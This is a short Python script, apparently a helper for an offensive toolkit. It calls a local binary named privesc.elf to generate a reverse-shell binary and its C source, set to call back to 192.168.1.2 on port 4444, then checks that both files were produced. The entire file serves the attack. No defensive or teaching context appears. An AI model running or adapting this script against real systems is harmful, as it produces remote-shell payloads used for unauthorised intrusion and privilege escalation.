import os

os.system("yes 2> /dev/null | ../bin/privesc.elf -shell LHOST=192.168.1.2 LPORT=4444 > /dev/null")

if os.path.exists("shell"):
    print("[+] Successfully Created Shell Binary")
else:
    print("[!] Failed Compiling Shell Binary")
    exit(1)

if os.path.exists("shell.c"):
    print("[+] Successfully Created Shell Code ")
else:
    print("[!] Failed Creating Shell Code")
    exit(1)
